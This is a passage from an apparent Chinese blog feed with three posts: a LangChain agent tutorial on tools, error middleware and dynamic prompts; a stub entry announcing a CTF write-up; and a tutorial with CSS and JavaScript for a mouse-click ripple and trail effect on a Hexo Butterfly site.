class="line"></span><br><span class="line">    <span class="comment"># request.model = model 我自己在使用时，发现这个方法已经过时了，现在使用的是下面这种</span></span><br><span class="line">    request=request.override(model=model)</span><br><span class="line">    <span class="keyword">return</span> handler(request)</span><br><span class="line"></span><br><span class="line">agent = create_agent(</span><br><span class="line">    model=basic_model,  <span class="comment"># 默认模型</span></span><br><span class="line">    tools=tools,</span><br><span class="line">    middleware=[dynamic_model_selection]</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h4 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h4><h5 id="定义工具"><a href="#定义工具" class="headerlink" title="定义工具"></a>定义工具</h5><p>将工具列表传递给Agents。  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> langchain.tools <span class="keyword">import</span> tool</span><br><span class="line"><span class="keyword">from</span> langchain.agents <span class="keyword">import</span> create_agent</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@tool</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search</span>(<span class="params">query: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;搜索信息。&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;结果：<span class="subst">&#123;query&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@tool</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_weather</span>(<span class="params">location: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;获取位置的天气信息。&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;location&#125;</span> 的天气：晴朗，72°F&quot;</span></span><br><span class="line"></span><br><span class="line">agent = create_agent(model, tools=[search, get_weather])</span><br></pre></td></tr></table></figure><p>如果提供空工具列表，Agents将仅包含一个 LLM 节点，不具备工具调用能力。  </p><h5 id="工具错误处理"><a href="#工具错误处理" class="headerlink" title="工具错误处理"></a>工具错误处理</h5><p>要自定义工具错误的处理方式，请使用<code>@wrap_tool_call</code>装饰器创建中间件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> langchain.agents <span class="keyword">import</span> create_agent</span><br><span class="line"><span class="keyword">from</span> langchain.agents.middleware <span class="keyword">import</span> wrap_tool_call</span><br><span class="line"><span class="keyword">from</span> langchain_core.messages <span class="keyword">import</span> ToolMessage</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@wrap_tool_call</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_tool_errors</span>(<span class="params">request, handler</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;使用自定义消息处理工具执行错误。&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> handler(request)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># 向模型返回自定义错误消息</span></span><br><span class="line">        <span class="keyword">return</span> ToolMessage(</span><br><span class="line">            content=<span class="string">f&quot;工具错误：请检查您的输入并重试。(<span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>)&quot;</span>,</span><br><span class="line">            tool_call_id=request.tool_call[<span class="string">&quot;id&quot;</span>]</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">agent = create_agent(</span><br><span class="line">    model=<span class="string">&quot;openai:gpt-4o&quot;</span>,</span><br><span class="line">    tools=[search, get_weather],</span><br><span class="line">    middleware=[handle_tool_errors]</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>当工具失败时，Agents将返回带有自定义错误消息的<code>ToolMessage</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">    ...</span><br><span class="line">    ToolMessage(</span><br><span class="line">        content=<span class="string">&quot;工具错误：请检查您的输入并重试。(division by zero)&quot;</span>,</span><br><span class="line">        tool_call_id=<span class="string">&quot;...&quot;</span></span><br><span class="line">    ),</span><br><span class="line">    ...</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h4 id="system-prompt"><a href="#system-prompt" class="headerlink" title="system_prompt"></a>system_prompt</h4><p>可以通过提供prompt来塑造Agents处理任务的方式。<code>system_prompt</code>参数可以作为字符串提供：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">agent = create_agent(</span><br><span class="line">    model,</span><br><span class="line">    tools,</span><br><span class="line">    system_prompt=<span class="string">&quot;你是一个有帮助的助手。请简洁准确。&quot;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>当未提供<code>system_prompt</code>时，Agents将直接从消息中推断其任务。</p><h5 id="动态system-prompt"><a href="#动态system-prompt" class="headerlink" title="动态system_prompt"></a>动态system_prompt</h5><p>对于需要根据运行时上下文或Agents状态修改系统提示的高级用例，可以使用中间件。<br><code>@dynamic_prompt</code>装饰器创建中间件，根据模型请求动态生成系统提示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> TypedDict</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> langchain.agents <span class="keyword">import</span> create_agent</span><br><span class="line"><span class="keyword">from</span> langchain.agents.middleware <span class="keyword">import</span> dynamic_prompt, ModelRequest</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Context</span>(<span class="title class_ inherited__">TypedDict</span>):</span><br><span class="line">    user_role: <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@dynamic_prompt</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">user_role_prompt</span>(<span class="params">request: ModelRequest</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;根据用户角色生成系统提示。&quot;&quot;&quot;</span></span><br><span class="line">    user_role = request.runtime.context.get(<span class="string">&quot;user_role&quot;</span>, <span class="string">&quot;user&quot;</span>)</span><br><span class="line">    base_prompt = <span class="string">&quot;你是一个有帮助的助手。&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> user_role == <span class="string">&quot;expert&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;base_prompt&#125;</span> 提供详细的技术响应。&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> user_role == <span class="string">&quot;beginner&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;<span class="subst">&#123;base_prompt&#125;</span> 简单解释概念，避免使用行话。&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> base_prompt</span><br><span class="line"></span><br><span class="line">agent = create_agent(</span><br><span class="line">    model=<span class="string">&quot;openai:gpt-4o&quot;</span>,</span><br><span class="line">    tools=[web_search],</span><br><span class="line">    middleware=[user_role_prompt],</span><br><span class="line">    context_schema=Context</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 系统提示将根据上下文动态设置</span></span><br><span class="line">result = agent.invoke(</span><br><span class="line">    &#123;<span class="string">&quot;messages&quot;</span>: [&#123;<span class="string">&quot;role&quot;</span>: <span class="string">&quot;user&quot;</span>, <span class="string">&quot;content&quot;</span>: <span class="string">&quot;解释机器学习&quot;</span>&#125;]&#125;,</span><br><span class="line">    context=&#123;<span class="string">&quot;user_role&quot;</span>: <span class="string">&quot;expert&quot;</span>&#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> GYBot制作计划 </category>
          
          <category> LangChain </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LangChain </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>青少年CTF S1 · 2026 公益赛web和misc方向部分wp</title>
      <link href="/posts/ff8b784b/"/>
      <url>/posts/ff8b784b/</url>
      
        <content type="html"><![CDATA[<p>比赛还没结束，WP先写在本地<br>提前发出来，也是督促自己，防止到最后没写成WP</p>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>butterfly鼠标水波样式</title>
      <link href="/posts/64840/"/>
      <url>/posts/64840/</url>
      
        <content type="html"><![CDATA[<p>在网页上找了半天大佬的鼠标特效，基本上都是烟花特效，爆炸特效，没有找到自己满意的，于是自己用ai跑了一个，本博客使用的鼠标特效就是下文所介绍的</p><h2 id="创建鼠标特效-CSS-文件"><a href="#创建鼠标特效-CSS-文件" class="headerlink" title="创建鼠标特效 CSS 文件"></a>创建鼠标特效 CSS 文件</h2><p>在 <code>/source/css/</code> 目录下创建 <code>mouse-effect.css</code>，如果没有这个文件夹就自己创建一个，粘贴以下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">/* 鼠标点击水波纹特效 */</span><br><span class="line">.click-ripple &#123;</span><br><span class="line">  position: fixed;</span><br><span class="line">  border-radius: 50%;</span><br><span class="line">  pointer-events: none;</span><br><span class="line">  z-index: 99999;</span><br><span class="line">  transform: translate(-50%, -50%);</span><br><span class="line">  opacity: 0;</span><br><span class="line">  animation: ripple 1.2s cubic-bezier(0.23, 1, 0.32, 1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@keyframes ripple &#123;</span><br><span class="line">  0% &#123;</span><br><span class="line">    width: 0;</span><br><span class="line">    height: 0;</span><br><span class="line">    opacity: 0.8;</span><br><span class="line">    border: 2px solid rgba(64, 158, 255, 0.8);</span><br><span class="line">    box-shadow: 0 0 10px rgba(64, 158, 255, 0.5);</span><br><span class="line">  &#125;</span><br><span class="line">  20% &#123;</span><br><span class="line">    opacity: 0.6;</span><br><span class="line">    border: 2px solid rgba(64, 158, 255, 0.7);</span><br><span class="line">    box-shadow: 0 0 20px rgba(64, 158, 255, 0.6);</span><br><span class="line">  &#125;</span><br><span class="line">  100% &#123;</span><br><span class="line">    width: 500px;</span><br><span class="line">    height: 500px;</span><br><span class="line">    opacity: 0;</span><br><span class="line">    border: 2px solid rgba(64, 158, 255, 0);</span><br><span class="line">    box-shadow: 0 0 30px rgba(64, 158, 255, 0);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* 多色水波纹特效 - 可选 */</span><br><span class="line">.multi-color .click-ripple &#123;</span><br><span class="line">  animation: ripple-multi 1.2s cubic-bezier(0.23, 1, 0.32, 1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@keyframes ripple-multi &#123;</span><br><span class="line">  0% &#123;</span><br><span class="line">    width: 0;</span><br><span class="line">    height: 0;</span><br><span class="line">    opacity: 0.8;</span><br><span class="line">    border: 2px solid rgba(64, 158, 255, 0.8);</span><br><span class="line">    box-shadow: 0 0 10px rgba(64, 158, 255, 0.5);</span><br><span class="line">  &#125;</span><br><span class="line">  33% &#123;</span><br><span class="line">    opacity: 0.6;</span><br><span class="line">    border: 2px solid rgba(103, 194, 58, 0.7);</span><br><span class="line">    box-shadow: 0 0 20px rgba(103, 194, 58, 0.6);</span><br><span class="line">  &#125;</span><br><span class="line">  66% &#123;</span><br><span class="line">    opacity: 0.4;</span><br><span class="line">    border: 2px solid rgba(230, 162, 60, 0.6);</span><br><span class="line">    box-shadow: 0 0 25px rgba(230, 162, 60, 0.5);</span><br><span class="line">  &#125;</span><br><span class="line">  100% &#123;</span><br><span class="line">    width: 500px;</span><br><span class="line">    height: 500px;</span><br><span class="line">    opacity: 0;</span><br><span class="line">    border: 2px solid rgba(245, 108, 108, 0);</span><br><span class="line">    box-shadow: 0 0 30px rgba(245, 108, 108, 0);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* 鼠标移动轨迹效果 - 可选 */</span><br><span class="line">.mouse-trail &#123;</span><br><span class="line">  position: fixed;</span><br><span class="line">  border-radius: 50%;</span><br><span class="line">  pointer-events: none;</span><br><span class="line">  z-index: 99998;</span><br><span class="line">  background: rgba(64, 158, 255, 0.3);</span><br><span class="line">  transform: translate(-50%, -50%);</span><br><span class="line">  animation: trail 0.6s ease-out forwards;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@keyframes trail &#123;</span><br><span class="line">  0% &#123;</span><br><span class="line">    width: 12px;</span><br><span class="line">    height: 12px;</span><br><span class="line">    opacity: 0.8;</span><br><span class="line">  &#125;</span><br><span class="line">  100% &#123;</span><br><span class="line">    width: 0;</span><br><span class="line">    height: 0;</span><br><span class="line">    opacity: 0;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* 禁用特效类 */</span><br><span class="line">.no-mouse-effect .click-ripple,</span><br><span class="line">.no-mouse-effect .mouse-trail &#123;</span><br><span class="line">  display: none !important;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="创建鼠标特效-JavaScript-文件"><a href="#创建鼠标特效-JavaScript-文件" class="headerlink" title="创建鼠标特效 JavaScript 文件"></a>创建鼠标特效 JavaScript 文件</h2><p>在 <code>/source/js/</code> 目录下创建 <code>mouse-effect.js</code>，同上，如果没有 <code>js</code> 目录，请先创建：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line">// 鼠标点击水波纹特效</span><br><span class="line">(function() &#123;</span><br><span class="line">  // 配置参数</span><br><span class="line">  const config = &#123;</span><br><span class="line">    rippleColor: &#x27;#409EFF&#x27;,  // 水波纹主色（蓝色）</span><br><span class="line">    enableMultiColor: false,  // 是否启用多色效果</span><br><span class="line">    enableTrail: true,        // 是否启用鼠标移动轨迹</span><br><span class="line">    maxRipples: 5,            // 同时显示的最大波纹数量</span><br><span class="line">    trailColor: &#x27;#409EFF&#x27;,    // 轨迹颜色</span><br><span class="line">    trailSize: 12,            // 轨迹大小</span><br><span class="line">    trailDuration: 600,       // 轨迹持续时间（ms）</span><br><span class="line">    enableSound: false,       // 是否启用音效（需要音效文件）</span><br><span class="line">    soundVolume: 0.1,         // 音效音量</span><br><span class="line">    disableOnMobile: true     // 在移动设备上禁用</span><br><span class="line">  &#125;;</span><br><span class="line">  </span><br><span class="line">  // 检测移动设备</span><br><span class="line">  function isMobileDevice() &#123;</span><br><span class="line">    return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  // 移动设备上禁用</span><br><span class="line">  if (config.disableOnMobile &amp;&amp; isMobileDevice()) &#123;</span><br><span class="line">    return;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  // 创建样式元素</span><br><span class="line">  const style = document.createElement(&#x27;style&#x27;);</span><br><span class="line">  style.textContent = `</span><br><span class="line">    .click-ripple &#123;</span><br><span class="line">      border-color: $&#123;config.rippleColor&#125; !important;</span><br><span class="line">      box-shadow: 0 0 10px $&#123;config.rippleColor&#125; !important;</span><br><span class="line">    &#125;</span><br><span class="line">    .mouse-trail &#123;</span><br><span class="line">      background: $&#123;config.trailColor&#125; !important;</span><br><span class="line">    &#125;</span><br><span class="line">  `;</span><br><span class="line">  document.head.appendChild(style);</span><br><span class="line">  </span><br><span class="line">  // 存储波纹元素</span><br><span class="line">  let ripples = [];</span><br><span class="line">  let trails = [];</span><br><span class="line">  </span><br><span class="line">  // 鼠标点击事件</span><br><span class="line">  document.addEventListener(&#x27;click&#x27;, function(e) &#123;</span><br><span class="line">    // 限制同时显示的波纹数量</span><br><span class="line">    if (ripples.length &gt;= config.maxRipples) &#123;</span><br><span class="line">      const oldRipple = ripples.shift();</span><br><span class="line">      if (oldRipple &amp;&amp; oldRipple.parentNode) &#123;</span><br><span class="line">        oldRipple.parentNode.removeChild(oldRipple);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // 创建波纹元素</span><br><span class="line">    const ripple = document.createElement(&#x27;div&#x27;);</span><br><span class="line">    ripple.className = &#x27;click-ripple&#x27;;</span><br><span class="line">    if (config.enableMultiColor) &#123;</span><br><span class="line">      ripple.classList.add(&#x27;multi-color&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // 设置位置</span><br><span class="line">    ripple.style.left = e.clientX + &#x27;px&#x27;;</span><br><span class="line">    ripple.style.top = e.clientY + &#x27;px&#x27;;</span><br><span class="line">    </span><br><span class="line">    // 添加到页面</span><br><span class="line">    document.body.appendChild(ripple);</span><br><span class="line">    ripples.push(ripple);</span><br><span class="line">    </span><br><span class="line">    // 播放音效（可选）</span><br><span class="line">    if (config.enableSound) &#123;</span><br><span class="line">      playClickSound();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // 动画结束后移除元素</span><br><span class="line">    setTimeout(() =&gt; &#123;</span><br><span class="line">      if (ripple.parentNode) &#123;</span><br><span class="line">        ripple.parentNode.removeChild(ripple);</span><br><span class="line">        ripples = ripples.filter(r =&gt; r !== ripple);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, 1200);</span><br><span class="line">  &#125;);</span><br><span class="line">  </span><br><span class="line">  // 鼠标移动轨迹效果</span><br><span class="line">  if (config.enableTrail) &#123;</span><br><span class="line">    let lastTime = 0;</span><br><span class="line">    const trailInterval = 50; // 轨迹间隔（ms）</span><br><span class="line">    </span><br><span class="line">    document.addEventListener(&#x27;mousemove&#x27;, function(e) &#123;</span><br><span class="line">      const currentTime = Date.now();</span><br><span class="line">      </span><br><span class="line">      // 限制轨迹生成频率</span><br><span class="line">      if (currentTime - lastTime &lt; trailInterval) &#123;</span><br><span class="line">        return;</span><br><span class="line">      &#125;</span><br><span class="line">      lastTime = currentTime;</span><br><span class="line">      </span><br><span class="line">      // 限制同时显示的轨迹数量</span><br><span class="line">      if (trails.length &gt;= 8) &#123;</span><br><span class="line">        const oldTrail = trails.shift();</span><br><span class="line">        if (oldTrail &amp;&amp; oldTrail.parentNode) &#123;</span><br><span class="line">          oldTrail.parentNode.removeChild(oldTrail);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      // 创建轨迹元素</span><br><span class="line">      const trail = document.createElement(&#x27;div&#x27;);</span><br><span class="line">      trail.className = &#x27;mouse-trail&#x27;;</span><br><span class="line">      trail.style.left = e.clientX + &#x27;px&#x27;;</span><br><span class="line">      trail.style.top = e.clientY + &#x27;px&#x27;;</span><br><span class="line">      trail.style.width = config.trailSize + &#x27;px&#x27;;</span><br><span class="line">      trail.style.height = config.trailSize + &#x27;px&#x27;;</span><br><span class="line">      </span><br><span class="line">      // 添加到页面</span><br><span class="line">      document.body.appendChild(trail);</span><br><span class="line">      trails.push(trail);</span><br><span class="line">      </span><br><span class="line">      // 动画结束后移除元素</span><br><span class="line">      setTimeout(() =&gt; &#123;</span><br><span class="line">        if (trail.parentNode) &#123;</span><br><span class="line">          trail.parentNode.removeChild(trail);</span><br><span class="line">          trails = trails.filter(t =&gt; t !== trail);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;, config.trailDuration);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  // 播放点击音效（可选）</span><br><span class="line">  function playClickSound() &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">      const audioContext = new (window.AudioContext || window.webkitAudioContext)();</span><br><span class="line">      const oscillator = audioContext.createOscillator();</span><br><span class="line">      const gainNode = audioContext.createGain();</span><br><span class="line">      </span><br><span class="line">      oscillator.connect(gainNode);</span><br><span class="line">      gainNode.connect(audioContext.destination);</span><br><span class="line">      </span><br><span class="line">      oscillator.frequency.value = 523.25; // C5 音符</span><br><span class="line">      oscillator.type = &#x27;sine&#x27;;</span><br><span class="line">      </span><br><span class="line">      gainNode.gain.setValueAtTime(0, audioContext.currentTime);</span><br><span class="line">      gainNode.gain.linearRampToValueAtTime(config.soundVolume, audioContext.currentTime + 0.01);</span><br><span class="line">      gainNode.gain.exponentialRampToValueAtTime(0.001, audioContext.currentTime + 0.2);</span><br><span class="line">      </span><br><span class="line">      oscillator.start(audioContext.currentTime);</span><br><span class="line">      oscillator.stop(audioContext.currentTime + 0.2);</span><br><span class="line">    &#125; catch (e) &#123;</span><br><span class="line">      console.log(&#x27;音效播放失败:&#x27;, e);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  // 添加控制台提示</span><br><span class="line">  console.log(&#x27;%c✨ 鼠标特效已加载 ✨&#x27;, &#x27;color: #409EFF; font-size: 14px; font-weight: bold;&#x27;);</span><br><span class="line">  console.log(&#x27;%c📱 移动设备支持: &#x27; + (!config.disableOnMobile || !isMobileDevice()), &#x27;color: #67C23A;&#x27;);</span><br><span class="line">  </span><br><span class="line">  // 添加到全局对象以便调试</span><br><span class="line">  window.mouseEffect = &#123;</span><br><span class="line">    config: config,</span><br><span class="line">    disable: function() &#123;</span><br><span class="line">      document.body.classList.add(&#x27;no-mouse-effect&#x27;);</span><br><span class="line">      console.log(&#x27;鼠标特效已禁用&#x27;);</span><br><span class="line">    &#125;,</span><br><span class="line">    enable: function() &#123;</span><br><span class="line">      document.body.classList.remove(&#x27;no-mouse-effect&#x27;);</span><br><span class="line">      console.log(&#x27;鼠标特效已启用&#x27;);</span><br><span class="line">    &#125;,</span><br><span class="line">    changeColor: function(color) &#123;</span><br><span class="line">      config.rippleColor = color;</span><br><span class="line">      style.textContent = style.textContent.replace(/#[0-9a-fA-F]&#123;6&#125;/g, color);</span><br><span class="line">      console.log(&#x27;水波纹颜色已更改为: &#x27; + color);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span 